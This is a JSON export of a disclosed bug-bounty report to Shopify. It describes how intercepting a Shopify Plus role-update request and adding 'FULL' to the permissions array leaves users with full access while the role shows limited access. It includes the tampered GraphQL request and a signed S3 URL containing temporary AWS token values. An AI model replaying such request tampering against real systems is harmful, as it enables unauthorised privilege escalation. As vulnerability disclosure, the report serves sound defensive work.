{
  "id": 1088159,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMDg4MTU5",
  "url": "https://hackerone.com/reports/1088159",
  "title": "[h1-2102] Break permissions waterfall",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "low",
  "readable_substate": "Resolved",
  "created_at": "2021-01-26T22:03:05.175Z",
  "submitted_at": "2021-01-26T22:03:05.194Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "hogarth45",
    "url": "/hogarth45",
    "profile_picture_urls": {
      "small": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/4bnmcdf8ew5o8aj3zk02v0vg6ddq/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1?response-content-disposition=inline%3B%20filename%3D%22H.png%22%3B%20filename%2A%3DUTF-8%27%27H.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQYTQGV5GZ%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T002720Z&X-Amz-Expires=465&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHoaCXVzLXdlc3QtMiJHMEUCIQCwhbkIxveZhOodpF28kRDeSDSp7T4u0QK6qKiMsYgYEAIgFr2Er4x9BdPmePuEEnJ5%2F1Z%2FsNeE7caNJn3gt%2B5oeC8qugUI8%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDGfZU4nXJ%2FjIkTUqtCqOBR5SpTy2Ed5z%2FTTcmsioC%2FY2rr2eMAFnoXEzJb9ViTG12PeoN8nhQmWCENUB9o3pxoAOhinaXjzfLkz0h%2ByuYNJdSIgBuerrJqMpE5xI9C2yiynVCclpd67yafef2uTvlodj3twP%2F1dVqwBVhr57yreQltd0DHD5QeGeRcV5CuCcuW12fCeUeH%2Fl3lqnE83WhNqo94nX1OoIFLjVgOQOlR8KG5cwmzU0D0q5KaKASXmE4VwMe52ssI6VsiODNg1%2F6yRro5xr1MczuqXGoOKe36N%2BvXhortdrmw1KmtRfS%2FvlGTXwgCtSvwv7GsC8c2PDNcXtm%2F%2Flbl4ag9tsNP2%2BAH9UN6aMx%2BTIk2whw%2FQekzmnV1U5rZe8Tlb76mBBypa1rHmWVCtXFXbtpgIUiZ5v3OYS4J6XcUnf4iNabXkPzx2jncKK6W%2FSTaMaBntHWYdIg44dAxtQ59xfgAzul46%2BdMFzB%2BsP5LNeAdQgIA15obtVS6XDnQY1Dm3ndhwt7PuGWVnHEtaV45R%2F4slMTgXSjNYYg0iEiVWN1F1P5yVHezV3KGequURouwOVGv9CYvSFaoM1r3mHVmnXE9PWuACoeXGHg5Mds7D8oLWZeNyxY%2BT49sNV6WORFKs8stnTgIlseRXnWcBSHNMfq7bY1lyB70sk7Ke6gc3W65y11VW1grDXvRmv5PlIJ3%2Fo6eItpE1%2BnMvq6oiqEWU6rvk3jYQN9F62AfHhQKzIqSJMmTRjei%2FmnxMQh3TJE4HI4U%2FCmXwHDFEYS8DEFM%2BSEJjN3F1ty8N3VD1zngeApKjGKd6znomPiATuMYxZBNbeEPGMkLU2eu4sR%2FgPwoXZgjZi%2BR5jH5AV0dq3WnLjNmL66YzQ%2FjDi2bvGBjqxAU%2Bn5zezATvkSNlA%2FRUoYoBKV%2FI2pruQggAivYHJg01BCZOBn4zWyxtaQD4CEt9vazegPTcK9H%2BN2HcnmQz%2FnDvaYxB1YCrcYM%2BvCic6rxNJulpkGsdMi46do3pTNKFZyRc3%2Be5JT3iFm5GQ7EBxtnY4FTF2%2FkulJwodURjvqhFv4YwjGcG3q87cTyf2SvQyKirv3lBNoITYdFdV%2BSaKOQDHH8DgLZ6%2B%2Fiao1jZFKa%2Fpiw%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=a35a53f8e2d5431822c012028e944712a99936d6df096377e33fab2448e16600"
    },
    "is_me?": false,
    "cleared": true,
    "verified": true,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 1382,
    "url": "https://hackerone.com/shopify",
    "handle": "shopify",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/d9695107bfcd68eeb1c9e0912b109cdae9a6c00c0bda6fd4cbd6d9bdb828840a"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "pentest_retesting_ends_at": null,
    "profile": {
      "name": "Shopify",
      "twitter_handle": "",
      "website": "https://www.shopify.com",
      "about": "Shopify is a multi-channel commerce platform that helps people sell online, in-store, and everywhere in between."
    }
  },
  "has_bounty?": true,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "submitted_with_assistant": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2022-02-12T20:48:26.037Z",
  "bug_reporter_agreed_on_going_public_at": "2022-02-12T20:48:25.969Z",
  "team_member_agreed_on_going_public_at": "2022-02-10T19:31:31.182Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "## Summary:\nShopify Plus User permission roles will propagate changes to all the users in the role\nIts possible to break this \nIf you pass FULL along with other Pemrissions into a user role edit\nIt will propagate to the users and give them full access while the role shows partial access\n\n## Steps To Reproduce:\n\n1. In Shopify Plus create a user role for a store and give it a handful of permissions\n2. Apply the role to a user\n3. Make a change to role and go back and you can see the change propagate to each of the users\nThis is true for adding permissions, taking away permissions, going Full access and back to Limited access\n\n5. Go back to the role\n6. Edit the permissions\n7. Turn on HTTP proxy\n8. Set Limited and select a few checkboxes\n9. Save\n10. Save\n11. Catch the Saving request (keep in Repeater) and alter the permissions array to contain the string FULL\n\n`\"permissions\":[\"DASHBOARD\",\"ORDERS\",\"GIFT_CARDS\",\"FULL\",\"REPORTS\",\"OVERVIEWS\"],`\n\n12. Both Role and User account will reflect the FULL access\n13. Alter the permissions array again with your Repeater request\nRemove FULL for some garbage data\n\n`\"permissions\":[\"DASHBOARD\",\"ORDERS\",\"GIFT_CARDS\",\"cheese\",\"REPORTS\",\"OVERVIEWS\"],`\n\n14. The Role will show that all users have limited access, but users will retain FULL access\n\n## Supporting Material/References:\n\n```\nPOST /34937697/users/api HTTP/1.1\nHost: shopify.plus\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0\nAccept: application/json\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\ncontent-type: application/json\nx-csrf-token: axogyrLP-YZ_UCyd_o8tdASj_uGTLc1wIT3c\nx-plus-tracking: 28909bfe-8318-4a3a-bb66-d5a7643eca13, a2f06bd6-efaf-434c-a2be-13454e95417a, users\nOrigin: https://shopify.plus\nContent-Length: 695\nConnection: close\nCookie: ██████\nX-h1-2102: hogarth45\n\n{\"operationName\":\"UpdateRole\",\"variables\":{\"appHandles\":[],\"id\":\"Z2lkOi8vb3JnYW5pemF0aW9uL1JvbGUvNjc4Nw\",\"name\":\"waterfall\",\"shopAccess\":[{\"appPermissions\":[],\"permissions\":[\"DASHBOARD\",\"ORDERS\",\"GIFT_CARDS\",\"FULL\",\"REPORTS\",\"OVERVIEWS\"],\"shopId\":\"Z2lkOi8vb3JnYW5pemF0aW9uL1Nob3AvMzQ5NjYwMzM\"}]},\"query\":\"mutation UpdateRole($appHandles: [String!], $id: RoleID!, $name: String!, $shopAccess: [ShopAccessInput!]) {\\n  updateRole(appHandles: $appHandles, id: $id, name: $name, shopAccess: $shopAccess) {\\n    role {\\n      id\\n      name\\n      __typename\\n    }\\n    userErrors {\\n      message\\n      field\\n      __typename\\n    }\\n    message\\n    operationStatus\\n    __typename\\n  }\\n}\\n\"}\n```\n\n## Impact\n\nusers who should be limited by their role can have excessive permissions",
  "bounty_amount": "500.0",
  "formatted_bounty": "$500",
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": null,
  "vote_count": 8,
  "voters": [
    "drsniper",
    "shreyaschavhan",
    "thalaivar304",
    "pacmanx",
    "h4x0r_dz",
    "aneet",
    "s0lidsnake",
    "ba2288d70a5c7c4863de301"
  ],
  "severity": {
    "rating": "low",
    "score": 2.2,
    "author_type": "Team",
    "metrics": {
      "attack_vector": "network",
      "attack_complexity": "high",
      "privileges_required": "high",
      "user_interaction": "none",
      "scope": "unchanged",
      "confidentiality": "none",
      "integrity": "low",
      "availability": "none"
    }
  },
  "structured_scope": {
    "databaseId": 62960,
    "asset_type": "OTHER",
    "asset_identifier": "Plus Web Admin with Single Domain Feature",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
